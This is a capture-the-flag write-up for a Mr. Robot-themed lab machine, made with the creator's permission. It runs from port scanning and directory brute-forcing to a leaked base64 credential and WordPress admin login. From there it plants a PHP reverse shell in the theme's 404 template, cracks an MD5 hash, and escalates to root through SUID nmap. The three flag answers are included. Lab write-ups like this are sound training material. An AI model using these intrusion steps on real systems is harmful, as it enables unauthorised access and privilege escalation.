# Task 2 Hack the machine

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to [Leon Johnson](https://twitter.com/@sho_luv) for creating this machine. **This machine is used here with the explicit permission of the creator <3**

### What is key 1?

`nmap -sS -p- -vv -Pn -T4 10.10.172.42`

port 80 and 443 are open

Navigating to website looks to be an animation of a computer booting and a message


![[Mr Robot CTF 01.png]]

The source is also interesting with a user IP?

```
<!doctype html>
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->
<html class="no-js" lang="">
  <head>
    

    <link rel="stylesheet" href="css/main-600a9791.css">

    <script src="js/vendor/vendor-48ca455c.js"></script>

    <script>var USER_IP='208.185.115.6';var BASE_URL='index.html';var RETURN_URL='index.html';var REDIRECT=false;window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};</script>

  </head>
  <body>
    <!--[if lt IE 9]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    

    <!-- Google Plus confirmation -->
    <div id="app"></div>

    
    <script src="js/s_code.js"></script>
    <script src="js/main-acba06a5.js"></script>
</body>
</html>

```

And /robots.txt

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Both HTTP and HTTPS sites look similar, the HTTPS site is a self signed cert.

The site `https://10.10.172.42/key-1-of-3.txt` provides the first key

Answer: `073403c8a58a1f80d943455fb30724b9`

### What is key 2?

Download `https://10.10.172.42/fsocity.dic`

At first glance, this appears to be a word list, possibly passwords.

In the web console, `prepare` runs a video, the other options all have some video or newspaper clippings, except join.

It shows text from `<mr. robot>` asking us to join and enter an email address.

`gobuster dir --url 10.10.172.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

Returns `sitemap`, `readme`
```
/blog                 (Status: 301) [Size: 233] [--> http://10.10.172.42/blog/]
/sitemap              (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 235] [--> http://10.10.172.42/images/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.172.42/feed/]
/login                (Status: 302) [Size: 0] [--> http://10.10.172.42/wp-login.php]
/video                (Status: 301) [Size: 234] [--> http://10.10.172.42/video/]
/0                    (Status: 301) [Size: 0] [--> http://10.10.172.42/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.172.42/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.172.42/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.172.42/feed/atom/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.172.42/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.172.42/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.172.42/audio/]
/wp-login             (Status: 200) [Size: 2664]
/css                  (Status: 301) [Size: 232] [--> http://10.10.172.42/css/]
/intro                (Status: 200) [Size: 516314]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.172.42/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.172.42/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.172.42/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.172.42/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.172.42/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.172.42/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.172.42/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.172.42/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.172.42/wp-admin/]
/0000                 (Status: 301) [Size: 0] [--> http://10.10.172.42/0000/]

```

Readme: `I like where you head is at. However I'm not going to help you.`
Admin: seems to constantly reload

`wp-login.php` gives a wordpress logon page.

`/0/` gives a wordpress site.

`license` returns ``




```
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?

<SNIP>

do you want a password or something?

<SNIP>

ZWxsaW90OkVSMjgtMDY1Mgo=
```

Base64 decode the last line: `elliot:ER28-0652`

There is an image at `http://10.10.172.42/wp-content/uploads/2015/11/image.jpg`.    Using binwalk it doesn't look as though there is any extra data in it or Stenography.


`/feed/rdf` returns
```
<rdf:RDF>
<channel rdf:about="http://10.10.172.42">
<title>user's Blog!</title>
<link>http://10.10.172.42</link>
<description>Just another WordPress site</description>
<dc:date/>
<sy:updatePeriod>hourly</sy:updatePeriod>
<sy:updateFrequency>1</sy:updateFrequency>
<sy:updateBase>2000-01-01T12:00+00:00</sy:updateBase>
<admin:generatorAgent rdf:resource="http://wordpress.org/?v=4.3.1"/>
<items>
<rdf:Seq> </rdf:Seq>
</items>
</channel>
</rdf:RDF>
```

Go to the `wp-login` and use the `elliot:ER28-0652` credentials to get in.

The name is `Elliot Alderson`. email `elliot@mrrobot.com` and website `http://mrrobot.wikia.com/wiki/Elliot_Alderson`

Other users are `mich05654`, `krisa Gordon`, `kgordon@therapist.com`

Go to the website and use the command join, type in `kgordon@therapist.com` or `elliots` makes no difference

Reset `mich05654` password and logon as that user unable to find anything useful

Create a post on the wordpress site, no workflow triggered

`/phpmyadmin` returns `For security reasons, this URL is only accessible using localhost (127.0.0.1) as the hostname.`


As Elliot, go to Appearance, Editor, select the 404 template, paste in https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php modified to our IP address

Create the listener and navigate to a 404 page for the reverse shell.

we are now running as `daemon` in `/`
in `/home/robot` is the 2nd key we do not have read permission to, however there is a `password.raw-md5` that we do.  The file contains
`robot:c3fcd3d76192e4007dfb496cca67e13b`

`hashcat -a 0 -m 0 hash.txt rockyou.txt` reveals the password to be `abcdefghijklmnopqrstuvwxyz`

Looking at SUID bits, nmap is installed and has SUID.
```shell
cd /usr/local/bin
./nmap --interactive
!sh
whoami
```

And we are running as root.

Answer: `822c73956184f694993bede3eb39f959`


### What is key 3?

In the same elevated nmap shell, we `ls /root/` and we see key 3.
`cat /root/key-3-of-3.txt`

Answer: `04787ddef27c3dee1ee161b21670b4e4`





Looking at walkthrough after the fact i couldn't run `su robot` to use the password as I didn't have a proper shell.
Running `python -c ‘import pty;pty.spawn(“/bin/bash”)’` would have allowed this.